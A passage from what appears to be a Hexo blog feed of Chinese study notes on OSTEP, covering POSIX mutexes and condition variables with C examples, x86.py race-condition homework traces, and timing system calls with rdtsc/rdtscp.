int</span><br><span class="line">      |                %d</span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; ./test</span><br><span class="line">12,6.666000</span><br><span class="line">12,6.666000⏎ </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> IEEE 754 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:27 Thread Api</title>
      <link href="/2023/04/15/OSTEP-27-Thread-Api/"/>
      <url>/2023/04/15/OSTEP-27-Thread-Api/</url>
      
        <content type="html"><![CDATA[<h2 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h2><h3 id="POSIX互斥锁"><a href="#POSIX互斥锁" class="headerlink" title="POSIX互斥锁"></a>POSIX互斥锁</h3><p><strong>使用锁之前先初始化</strong></p><blockquote><p><code>#include &lt;pthread.h&gt;</code></p><p>静态直接使用宏初始化<code>pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER</code><br>动态使用初始化函数<br><code>int pthread_mutex_init(pthread_mutex_t *mutex, const pthread_mutexattr_t *attr);</code></p><p>pthread_mutex_init(mutex,NULL)和用PTHREAD_MUTEX_INITIALIZER宏效果一样</p><p>attr属性</p><p><code>int pthread_mutexattr_gettype(pthread_mutexattr_t *attr,int *kind);</code>得到后</p><p><code>int pthread_mutexattr_settype(pthread_mutexattr_t *attr,int kind);  </code>；来设置</p><ul><li><p><code>PTHREAD_MUTEX_NORMAL</code>：普通类型互斥锁，不提供死锁检测或者错误检查。</p></li><li><p>PTHREAD_MUTEX_TIMED_NP，这是缺省值，也就是<strong>普通锁</strong>。<em>当一个线程加锁以后，其余请求锁的线程将形成一个等待队列，并在解锁后按优先级获得锁</em>。这种锁策略保证了资源分配的公平</p></li><li><p>PTHREAD_MUTEX_RECURSIVE_NP，<strong>嵌套锁</strong>，<em>允许同一个线程对同一个锁成功获得多次，并通过多次unlock解锁</em>。如果是不同线程请求，则在加锁线程解锁时重新竞争。</p></li><li><p>PTHREAD_MUTEX_ERRORCHECK_NP，<strong>检错锁</strong>，如果<em>同一个线程请求同一个锁，则返回EDEADLK</em>，否则与PTHREAD_MUTEX_TIMED_NP类型动作相同。这样保证当不允许多次加锁时不出现最简单情况下的死锁。</p></li><li><p>进程间共享（pshared）：可以设置为 <code>PTHREAD_PROCESS_PRIVATE</code> 或 <code>PTHREAD_PROCESS_SHARED</code>。默认为 <code>PTHREAD_PROCESS_PRIVATE</code>，表示仅在同一进程内共享。</p></li></ul><p>成功返回0，失败非0</p></blockquote><p><strong>加锁 解锁</strong></p><blockquote><p>加锁，互斥锁加锁状态线程进入等待(阻塞)状态，直到互斥锁释放</p><p><code>int pthread_mutex_lock(pthread_mutex_t* mutex); </code></p><p>加锁 互斥锁加锁状态线程之间返回非0</p><p><code>int pthread_mutex_trylock(pthread_mutex_t* mutex);</code></p><p>加锁，阻塞<strong>到</strong>tsptr<strong>指定时间</strong>的thread_mutex_lock，超时或获取锁后返回</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_timedlock</span><span class="params">(<span class="type">pthread_mutex_t</span> mutex, <span class="type">const</span> <span class="keyword">struct</span> timespec *tsptr)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> struct timespec &#123;</span></span><br><span class="line"><span class="comment"> time_t tv_sec;  // 秒</span></span><br><span class="line"><span class="comment"> long tv_nsec;   // 纳秒</span></span><br><span class="line"><span class="comment"> &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">使用时可以</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">time_out</span>;</span></span><br><span class="line">   clock_gettime(CLOCK_REALTIME, &amp;time_out);</span><br><span class="line">   time_out.tv_sec += seconds;</span><br><span class="line">pthread_mutex_timedlock(mutex,&amp;time_out)</span><br></pre></td></tr></table></figure><p>解锁</p><p><code>int pthread_mutex_unlock(pthread_mutex_t* mutex); </code></p><p>成功返回0，失败非0</p></blockquote><p><strong>销毁</strong></p><blockquote><p><code>int pthread_mutex_destroy(pthread_mutex_t *mutex);</code></p><p>要求锁当前初始化过且处于开放状态</p><p>成功返回0，失败非0</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER;<span class="comment">//让12都看见锁</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">Sum</span><span class="params">(<span class="type">void</span>*)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        assert(<span class="number">0</span> == pthread_mutex_lock(&amp;mutex));</span><br><span class="line">        sum++;</span><br><span class="line">        assert(<span class="number">0</span> == pthread_mutex_unlock(&amp;mutex));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_mutex_t</span> x;</span><br><span class="line">    <span class="type">pthread_t</span> pid1, pid2;</span><br><span class="line">    pthread_create(&amp;pid1, <span class="literal">NULL</span>, Sum, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;pid2, <span class="literal">NULL</span>, Sum, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pid1,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pid2,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_mutex_destroy(&amp;mutex);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="条件变量"><a href="#条件变量" class="headerlink" title="条件变量"></a>条件变量</h2><p>如果一个线程在等待另一个线程继续执行某些操作，条件变量就很有用，或者说是利用线程间共享的全局变量进行同步的机制，和互斥锁一起使用，避免竞态条件</p><p><strong>条件变量初始化</strong></p><blockquote><p>和锁差不多</p><p>pthread_cond_t  cond&#x3D;PTHREAD_COND_INITIALIZER  </p><p>int  pthread_cond_init(pthread_cond_t  *cond,  pthread_condattr_t  *cond_attr)</p></blockquote><p><strong>睡眠 唤醒</strong></p><blockquote><p>&gt;&gt;&gt;睡眠</p><p><code>int pthread_cond_wait(pthread_cond_t *cond, pthread_mutex_t *mutex);</code></p><p>阻塞当前线程，并把互斥锁解开,被唤醒后，返回前会再次获得互斥锁上锁</p><p><code>int pthread_cond_timedwait(pthread_cond_t *cond, pthread_mutex_t*mutex, const struct timespec *abstime);</code></p><p>比pthread_cond_wait多了限定的等待时间，abstime内没由被唤醒，上锁，结束等待，返回ETIMEOUT</p><p>&gt;&gt;&gt;唤醒</p><p><code>int pthread_cond_signal(pthread_cond_t *cond);</code></p><p>使在条件变量上等待的线程中的一个线程重新开始，优先级高等待时间长的线程先开始</p><p><code>int pthread_cond_broadcast(pthread_cond_t *cond);</code></p><p>唤醒所有条件变量上等待的线程</p></blockquote><p><strong>销毁条件变量</strong></p><blockquote><p><code>int  pthread_cond_destroy(pthread_cond_t  *cond)</code></p><p>使用前必须没有在该条件变量上等待的线程  </p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">pthread_mutex_t</span> lock = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"><span class="type">pthread_cond_t</span> cond = PTHREAD_COND_INITIALIZER;</span><br><span class="line"><span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">thread_func</span><span class="params">(<span class="type">void</span>*)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        assert(pthread_mutex_lock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span> (flag == <span class="literal">false</span>) &#123;<span class="comment">//这里为什么要用while而不是if? POSIX标准要求pthread_cond_signal至少唤醒一个pthread_cond_wait上的线程，</span></span><br><span class="line">            <span class="comment">//有一些 pthread实现可能会错误地唤醒等待的线程，加个while即使被错误唤醒，while条件不满足，继续等待</span></span><br><span class="line">            pthread_cond_wait(&amp;cond, &amp;lock);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;grxer&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        assert(pthread_mutex_unlock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> pid;</span><br><span class="line">    pthread_create(&amp;pid, <span class="literal">NULL</span>, thread_func, <span class="literal">NULL</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);<span class="comment">//防止flag = true;执行比while (flag == false)早</span></span><br><span class="line">    assert(pthread_mutex_lock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">    flag = <span class="literal">true</span>;<span class="comment">//操作flag临界量加个锁</span></span><br><span class="line">    pthread_cond_signal(&amp;cond);</span><br><span class="line">    assert(pthread_mutex_unlock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    flag = <span class="literal">false</span>;</span><br><span class="line">    assert(pthread_mutex_lock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">    flag = <span class="literal">true</span>;<span class="comment">//操作flag临界量加个锁</span></span><br><span class="line">    pthread_cond_signal(&amp;cond);</span><br><span class="line">    assert(pthread_mutex_unlock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">    pthread_join(pid, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_mutex_destroy(&amp;lock);</span><br><span class="line">    pthread_cond_destroy(&amp;cond);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;end&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:26 Concurrency:An Introduction Homework</title>
      <link href="/2023/04/15/OSTEP-homework-26-Concurrency-An-Introduction/"/>
      <url>/2023/04/15/OSTEP-homework-26-Concurrency-An-Introduction/</url>
      
        <content type="html"><![CDATA[<ul><li>临界区（critical section）是访问共享资源的一段代码，资源通常是一个变量或数据结构</li><li>竞态条件（race condition）出现在多个执行线程大致同时进入临界区时，它们都试图更新共享的数据结构</li></ul><ol start="3"><li></li></ol><p>没有共享变量，哪来的竞态条件</p><ol start="6"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/threads-intro&gt; cat looping-race-nolock.s</span><br><span class="line"><span class="meta"># assumes %bx has loop count in it</span></span><br><span class="line"></span><br><span class="line">.main</span><br><span class="line">.top</span><br><span class="line"><span class="meta"># critical section</span></span><br><span class="line">mov <span class="number">2000</span>, %ax  <span class="meta"># get <span class="string">&#x27;value&#x27;</span> at address 2000</span></span><br><span class="line">add $<span class="number">1</span>, %ax    <span class="meta"># increment it</span></span><br><span class="line">mov %ax, <span class="number">2000</span>  <span class="meta"># store it back</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># see <span class="keyword">if</span> we<span class="string">&#x27;re still looping</span></span></span><br><span class="line"><span class="string"><span class="meta">sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">halt</span></span></span><br><span class="line"><span class="string"><span class="meta">grxer@grxer ~/D/s/O/o/threads-intro&gt; python ./x86.py -p looping-race-nolock.s -t 2 -M 2000  -i 4 -r -s 0 -c</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG seed 0</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG numthreads 2</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG program looping-race-nolock.s</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt frequency 4</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt randomness True</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG argv</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG load address 1000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memsize 128</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memtrace 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG regtrace</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG cctrace False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG printstats False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG verbose False</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta"> 2000          Thread 0                Thread 1</span></span></span><br><span class="line"><span class="string"><span class="meta">    0</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ----- Halt;Switch -----  ----- Halt;Switch -----</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">grxer@grxer ~/D/s/O/o/threads-intro&gt; python ./x86.py -p looping-race-nolock.s -t 2 -M 2000  -i 4 -r -s 1 -c</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG seed 1</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG numthreads 2</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG program looping-race-nolock.s</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt frequency 4</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt randomness True</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG argv</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG load address 1000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memsize 128</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memtrace 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG regtrace</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG cctrace False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG printstats False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG verbose False</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta"> 2000          Thread 0                Thread 1</span></span></span><br><span class="line"><span class="string"><span class="meta">    0</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    0                            1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    0                            1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ----- Halt;Switch -----  ----- Halt;Switch -----</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">grxer@grxer ~/D/s/O/o/threads-intro&gt; python ./x86.py -p looping-race-nolock.s -t 2 -M 2000  -i 4 -r -s 2 -c</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG seed 2</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG numthreads 2</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG program looping-race-nolock.s</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt frequency 4</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt randomness True</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG argv</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG load address 1000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memsize 128</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memtrace 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG regtrace</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG cctrace False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG printstats False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG verbose False</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta"> 2000          Thread 0                Thread 1</span></span></span><br><span class="line"><span class="string"><span class="meta">    0</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ----- Halt;Switch -----  ----- Halt;Switch -----</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1006 halt</span></span></span><br></pre></td></tr></table></figure><p>不在临界区之间发生中断就可以的到正确结果</p><ol start="7"><li></li></ol><p>可想而知，只有-i 3及更大可以避开竞态区</p><ol start="8"><li></li></ol><p>围绕着不在临界区发生中断来</p><p>-i 大于597(执行100次共600条指令，后面三条和竞态没关系)或者是3的倍数就可以</p><ol start="9"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/threads-intro&gt; cat wait-<span class="keyword">for</span>-me.s</span><br><span class="line">.main</span><br><span class="line">test $<span class="number">1</span>, %ax     <span class="meta"># ax should be 1 (signaller) or 0 (waiter)</span></span><br><span class="line">je .signaller</span><br><span class="line"></span><br><span class="line">.waiter</span><br><span class="line">mov  <span class="number">2000</span>, %cx</span><br><span class="line">test $<span class="number">1</span>, %cx</span><br><span class="line">jne .waiter</span><br><span class="line">halt</span><br><span class="line"></span><br><span class="line">.signaller</span><br><span class="line">mov  $<span class="number">1</span>, <span class="number">2000</span></span><br><span class="line">halt</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/threads-intro&gt; python ./x86.py -p wait-<span class="keyword">for</span>-me.s -a ax=<span class="number">1</span>,ax=<span class="number">0</span> -R ax,cx -M <span class="number">2000</span> -c</span><br><span class="line">ARG seed <span class="number">0</span></span><br><span class="line">ARG numthreads <span class="number">2</span></span><br><span class="line">ARG program wait-<span class="keyword">for</span>-me.s</span><br><span class="line">ARG interrupt frequency <span class="number">50</span></span><br><span class="line">ARG interrupt randomness False</span><br><span class="line">ARG argv ax=<span class="number">1</span>,ax=<span class="number">0</span></span><br><span class="line">ARG load address <span class="number">1000</span></span><br><span class="line">ARG memsize <span class="number">128</span></span><br><span class="line">ARG memtrace <span class="number">2000</span></span><br><span class="line">ARG regtrace ax,cx</span><br><span class="line">ARG cctrace False</span><br><span class="line">ARG printstats False</span><br><span class="line">ARG verbose False</span><br><span class="line"></span><br><span class="line"> <span class="number">2000</span>      ax    cx          Thread <span class="number">0</span>                Thread <span class="number">1</span></span><br><span class="line">    <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span></span><br><span class="line">    <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span>   <span class="number">1000</span> test $<span class="number">1</span>, %ax</span><br><span class="line">    <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span>   <span class="number">1001</span> je .signaller</span><br><span class="line">    <span class="number">1</span>       <span class="number">1</span>     <span class="number">0</span>   <span class="number">1006</span> mov  $<span class="number">1</span>, <span class="number">2000</span></span><br><span class="line">    <span class="number">1</span>       <span class="number">1</span>     <span class="number">0</span>   <span class="number">1007</span> halt</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">0</span>   ----- Halt;Switch -----  ----- Halt;Switch -----</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">0</span>                            <span class="number">1000</span> test $<span class="number">1</span>, %ax</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">0</span>                            <span class="number">1001</span> je .signaller</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">1</span>                            <span class="number">1002</span> mov  <span class="number">2000</span>, %cx</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">1</span>                            <span class="number">1003</span> test $<span class="number">1</span>, %cx</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">1</span>                            <span class="number">1004</span> jne .waiter</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">1</span>                            <span class="number">1005</span> halt</span><br></pre></td></tr></table></figure><ol start="10"><li></li></ol><p>相当于交换线程，在线程0等待到中断后线程1把eax设为1，之前都在做无用循环</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>       <span class="number">0</span>     <span class="number">0</span>   <span class="number">1002</span> mov  <span class="number">2000</span>, %cx</span><br><span class="line"> <span class="number">0</span>       <span class="number">0</span>     <span class="number">0</span>   <span class="number">1003</span> test $<span class="number">1</span>, %cx</span><br><span class="line"> <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span>   ------ Interrupt ------  ------ Interrupt ------</span><br><span class="line"> <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span>                            <span class="number">1000</span> test $<span class="number">1</span>, %ax</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:6 Mechanism:Limited Direct Execution Homework</title>
      <link href="/2023/04/15/OSTEP-homework-6-Mechanism-Limited-Direct-Execution/"/>
      <url>/2023/04/15/OSTEP-homework-6-Mechanism-Limited-Direct-Execution/</url>
      
        <content type="html"><![CDATA[<ol><li></li></ol><p>书里说的rdtsc(TSC是一个64位的寄存器记录处理器从启动到现在的时钟周期数)把高32位放入edx，低32位放入rax，在多核处理器好像已经不太准确，</p><ul><li>CPU乱序执行之后，无法保证 rdtsc 指令的执行一定是在业务代码执行的之前和之后</li><li>处理器的变频</li><li>无法保证每个CPU核心的 TSC 寄存器是同步的</li></ul><p>引入了常量速率TSC的特性解决了变频问题<code> cat /proc/cpuinfo | grep constant_tsc</code>查看处理器是否支持，但是不能估计时间</p><p>对于乱序问题我们可以加cpu级的memory barrier<code>mfence</code></p><p>或者用rdtscp,他具有序列化特性，即它会在指令执行前等待之前的所有指令都执行完毕，并且在指令执行后保证没有后续指令会在它之前执行<code>cat /proc/cpuinfo | grep rdtscp</code>查看是否支持</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> period = <span class="number">0</span>, period2 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint64_t</span> low = <span class="number">0</span>, hight = <span class="number">0</span>,low2 = <span class="number">0</span>, hight2 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;./test.c&quot;</span>, O_RDWR);</span><br><span class="line">    assert(<span class="number">-1</span> != fd);</span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;rdtscp&quot;</span>:<span class="string">&quot;=a&quot;</span>(low), <span class="string">&quot;=d&quot;</span>(hight))</span>;</span><br><span class="line">    period = hight &lt;&lt; <span class="number">32</span> | low;</span><br><span class="line">    <span class="comment">// __asm__ __volatile__ (&quot;mfence&quot; : : : &quot;memory&quot;);//如果要使用rdtsc需要加barrier来防止乱序</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        read(fd, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// __asm__ __volatile__ (&quot;mfence&quot; 